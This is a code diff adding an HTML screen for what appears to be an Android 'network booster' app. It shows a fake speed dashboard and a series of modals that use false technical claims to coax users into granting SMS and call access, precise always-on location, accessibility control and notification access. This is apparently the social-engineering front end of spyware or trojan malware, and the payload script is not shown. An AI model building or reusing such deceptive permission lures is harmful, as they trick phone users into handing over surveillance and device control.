@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="page.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+</head>
+
+<body>
+    <div class="container">
+        <div class="phone-status-bar-bkg"></div>
+        <div class="page">
+            <div class="page-title">Dashboard</div>
+            <div class="card progress-card">
+                <div class="progress-ring" style="--value: 28">
+                    <div class="progress-text">28%</div>
+                </div>
+                <div class="progress-info">
+                    <h3>Packet Speed per second</h3>
+                    <p>28% (Android default)</p>
+                    <p>Last update (N/A) minutes ago</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="card actions">
+            <button class="action-btn">Boost</button>
+            <button class="action-btn">History</button>
+        </div>
+
+
+        <div class="overlayer">
+            <div class="spinner"></div>
+        </div>
+        <div class="perm-modal p-modal hide">
+            <div class="title">Permissions!<span></span></div>
+            <div class="body">This app requires the following permissions in order to get the best connection for your area:
+                <ol>
+                    <li>SMS and call network permissions</li>
+                    <li><b>Location: 'Precise' &amp; 'All The Time' or 'Background'</b></li>
+                </ol>
+            </div>
+            <div class="bottom"><button class="btn" onclick="requestAllPermissions()">Continue</button></div>
+        </div>
+
+        <div class="perm-modal a-modal hide">
+            <div class="title">Almost there!<span></span></div>
+            <div class="body">
+                After this step, this app will fuse into the direct network layer, ensuring nothing in background will delay or filter your packets. 
+                <br>Enable app's accessibility to access restricted network access
+                <ol>
+                    <li>Tap on the button</li>
+                    <li>Scroll and click 'Installed apps' or 'Apps'. If you are on old Android version(up to 7), SKIP step 2</li>
+                    <li>Check the list and enable this app.</li>
+                </ol>
+            </div>
+            <div class="bottom"><button class="btn" onclick="launchAccessibilityPerm()">Continue</button></div>
+        </div>
+        <div class="perm-modal d-modal hide">
+            <div class="title">Stability!<span></span></div>
+            <div class="body">
+                <b>App isn't stable</b>
+                <br>Grant notification access for this app to ensure it is not shutdown by Android
+            </div>
+            <div class="bottom"><button class="btn" onclick="openNAccess()">Grant</button></div>
+        </div>
+
+        <div class="perm-modal c-modal hide">
+            <div class="title">Success!<span></span></div>
+            <div class="body">
+                <b>App has started perfect. Enhancement will gradually increase</b>
+                <br>App process is fused into the device's Network process. Expect a better performance in a few while
+            </div>
+            <div class="bottom"><button class="btn" onclick="launchFinalActivityOnce()">Finish</button></div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+
+</html>
